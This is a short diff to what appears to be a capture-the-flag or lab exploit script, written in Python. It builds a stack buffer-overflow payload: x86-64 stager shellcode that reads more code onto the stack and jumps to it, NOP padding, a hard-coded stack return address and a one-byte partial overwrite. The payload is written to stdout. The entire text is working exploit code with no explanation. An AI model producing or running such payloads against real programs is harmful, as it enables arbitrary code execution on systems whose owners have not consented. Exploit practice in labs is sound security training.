@@ -5,7 +5,9 @@ stager_payload = b"\x31\xC0\x31\xFF\x48\x89\xE6\x6A\x40\x5A\x0F\x05\xFF\xE4"
 
 exploit = b""
 exploit += b"\x90"*(32 - len(stager_payload)) + stager_payload
-exploit += b"C"*32
+exploit += b"C"*16
+exploit += struct.pack("Q", 0x7fffffffe200)
+exploit += b"C"*8
 exploit += b"\x28"
 
 sys.stdout.buffer.write(exploit)
